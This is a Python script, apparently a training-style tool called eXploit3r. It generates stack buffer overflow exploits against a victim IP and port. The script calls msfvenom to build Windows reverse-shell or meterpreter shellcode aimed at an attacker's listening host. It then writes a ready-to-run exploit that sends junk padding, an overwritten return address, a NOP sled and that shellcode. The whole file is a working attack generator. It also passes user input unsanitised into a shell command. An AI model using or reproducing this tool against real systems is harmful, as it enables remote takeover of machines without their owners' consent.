#!/usr/bin/env python3

import argparse
import subprocess
import os

payloads = ['nc_shell', 'meterpreter']

class Args:
	def __init__(self):
		self.parser = argparse.ArgumentParser(
		    formatter_class=argparse.RawTextHelpFormatter,
		    description=f""
		)
		self.parser.add_argument(
			'-v',
			'--victim',
			dest="victim",
			required=True,
			help="A colon seperated (ip:port) information of the victim"
		)
		self.parser.add_argument(
			'-lhost',
			'--listening-host',
			dest="lhost",
			required=True,
			help="The IP Address of the host that will be initiating the attack"
		)
		self.parser.add_argument(
			'-lport',
			'--listening-port',
			dest="lport",
			type=int,
			required=True,
			help="The Port on which the attacker will be listening for reverse shells"
		)
		self.parser.add_argument(
			'-b',
			'--bad-chars',
			dest="bad_chars",
			required=True,
			help="The bad characters that will be excluded from the shell code.\nNote: Pass the badchars as a string literal: " + r"'\x00\x0A'"
		)
		self.parser.add_argument(
			'-eip',
			'--eip-address',
			dest="eip_address",
			required=True,
			help="The hexadecimal address of the Instruction Pointer"
		)
		self.parser.add_argument(
			'-o',
			'--offset',
			dest="offset",
			type=int,
			required=True,
			help="The offset at which the EIP is overwritten"
		)
		self.parser.add_argument(
			'-O',
			'--out-file',
			dest="out_file",
			help="The name of the output file that will contain the exploit"
		)
		self.parser.add_argument(
			'-p',
			'--payload',
			dest="payload",
			choices=payloads,
			required=True,
			help="The payload for which the shell code will be generated."
		)
	def parse(self):
		return self.parser.parse_args()

class Exploiter:
	def __init__(self, victim_ip, victim_port, rev_ip, rev_port, bad_chars, eip_addr, offset, payload, out_file):
		self.victim_ip = victim_ip
		self.victim_port = victim_port
		self.rev_ip = rev_ip
		self.rev_port = rev_port
		self.bad_chars = bad_chars
		self.eip_addr = eip_addr
		self.offset = offset
		self.payload = payload
		self.out_file = out_file
	
	def generate_shell_code(self):

		temp_file = '/tmp/shellcode.out'

		print("[+] Generating shellcode:")
		print("=" * 50)
		cmd =  f"-p {self.payload} LHOST={self.rev_ip} LPORT={self.rev_port} -f py -a x86 -b '{self.bad_chars}'"
		data = subprocess.check_output(f'/usr/bin/msfvenom {cmd} > {temp_file}', shell=True)
		print("=" * 50 + "\n[+] Done...")

		file = open(temp_file)
		shell_code = file.read()
		file.close()
		os.remove(temp_file)
		return shell_code

	def write_exploit(self):
		shell_code = self.generate_shell_code()

		writer = open(self.out_file, 'w+')

		writer.write(f"""#!/usr/bin/env python3\n# Crafted using eXploit3r. Written by @TheFlash2k\nfrom socket import *\nfrom struct import pack\n\n# Establishing connection\ns = socket()\ns.connect((\"{self.victim_ip}\",{self.victim_port}))\ns.recv(1024)\n\n# Setting up basic stuff\noffset = {self.offset}\njunk = b'A' * offset\naddr = {self.eip_addr}\n\n# Converting the address to bytes using the struct.pack function\naddr = pack('<I', addr)\n\n# No-operations\nnops = b'\\x90' * 30\n\n# Shell code genereated by msfvenom:\n{shell_code}\n\n# Setting up final payload that will be sent:\npayload = junk + addr + nops + buf\n\n# Sending the payload\ns.send(payload)\n\n# Closing the session:\ns.close()\n###############################""")
		writer.close()
		print(f"[*] Exploit written to {self.out_file} successfully!")

def main():
	args = Args()
	parser = args.parse()
	args = list()

	victim = parser.victim
	try:	
		victim_ip = victim.split(':')[0]
		victim_port = victim.split(':')[1]
	except Exception as e:
		print("[-] Invalid Victim IP:PORT provided. Please provided in the following format:\nIP:PORT -> 192.168.0.105:9999")
		exit()

	reve_ip = parser.lhost
	reve_port = parser.lport
	bad_chars = parser.bad_chars
	eip_addr = parser.eip_address
	offset = parser.offset
	payload = parser.payload
	out_file = parser.out_file

	payload = "windows/shell_reverse_tcp" if payload == 'nc_shell' else "windows/meterpreter/reverse_tcp"
	out_file = "exploit.py" if not out_file else out_file + ".py"

	exp = Exploiter(
		victim_ip=victim_ip, victim_port=victim_port,
		rev_ip=reve_ip, rev_port=reve_port, 
		bad_chars=bad_chars, eip_addr=eip_addr,
		offset=offset, payload=payload,
		out_file=out_file
	)
	exp.write_exploit()

if __name__ == "__main__":
	main()
